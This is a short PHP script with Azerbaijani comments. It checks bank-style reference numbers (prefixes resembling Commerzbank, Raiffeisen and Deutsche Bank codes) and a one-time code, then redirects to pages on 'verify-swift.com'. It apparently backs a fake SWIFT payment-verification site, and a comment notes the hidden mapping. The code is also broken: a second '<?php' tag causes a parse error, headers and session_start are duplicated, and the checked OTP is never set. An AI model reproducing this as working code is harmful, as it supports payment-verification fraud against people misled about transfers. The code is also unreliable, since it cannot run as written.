<?php
// Bu sətirlər xətaların qarşısını alır
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

session_start();
<?php
header('Content-Type: application/json');
session_start();

// Gələn məlumatı alırıq
$data = json_decode(file_get_contents('php://input'), true);
$action = $data['action'] ?? '';

// Referans nömrələri və keçid linkləri (İstifadəçi bunu görə bilməz)
$refMap = [
    'COBA300525CH59279' => 'https://verify-swift.com/verification-cob.html',
    'COBA310625CH68412' => 'https://verify-swift.com/verification-cob-abnab',
    'COBA011125CH77290' => 'https://verify-swift.com/verification-code-abnaz.html',
    'COBA011125CH86478' => 'https://verify-swift.com/verification-abnzdf',
    'COBA780533CH12564' => 'https://verify-swift.com/verification-cob-aznasdf',
    'RZBA780533WW25874' => 'https://verify-swift.com/verification-cob-xbnetzr',
    'COBA780533CH25879' => 'https://verify-swift.com/verification-cob-nzb198adm',
    'COBA310625CH665478' => 'https://verify-swift.com/verification-cob-sdf6589db23',
    'COBA515626CH63378' => 'https://verify-swift.com/verification-cob-pdg32541ab25',
    'CBA17112248B401-130226' => 'https://verify-swift.com/verification-cob-utg566290vcd77',
    'DEU17112212C456-170326' => 'https://verify-swift.com/verification-cob-sam54df677',
    'CBA17112248B401-160226' => 'https://verify-swift.com/verification-cob-bm65tb7654xz',
    'DEU349827091C679-230326' => 'https://verify-swift.com/verification-cob-cju228ac749nb',
    'CBA17112248B401-230226' => 'https://verify-swift.com/verfication-cob-an653cbt789g',
    'RCAS29016976S' => 'https://verify-swift.com/check/verify/verifymt199/index.html',
    'DEU549325112B147-270326' => 'https://verify-swift.com/verification-cob-ds145av41sa17n',
    '2026-03-30-2020A76' => 'https://verify-swift.com/check/verify/verifymt199/mt996as7821vba921',
    'DEU17112212C332-230326' => 'https://verify-swift.com/verfication-cob-by653atm688v'
];

// 1. ADIM: Referans yoxlanışı
if ($action === 'check_ref') {
    $ref = $data['ref'] ?? '';
    if (array_key_exists($ref, $refMap)) {
        $_SESSION['pending_ref'] = $ref; // Referansı sessiyada saxlayırıq
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Invalid reference number.']);
    }
}

// 2. ADIM: Kodun yoxlanılması
elseif ($action === 'verify_otp') {
    $userCode = $data['code'] ?? '';
    $sentCode = $_SESSION['otp_code'] ?? '';

    if ($userCode !== '' && $userCode == $sentCode) {
        $finalRef = $_SESSION['pending_ref'];
        echo json_encode([
            'success' => true, 
            'redirect' => $refMap[$finalRef]
        ]);
        session_destroy(); // Təhlükəsizlik üçün sessiyanı təmizləyirik
    } else {
        echo json_encode(['success' => false, 'message' => 'Incorrect code.']);
    }
}
?>
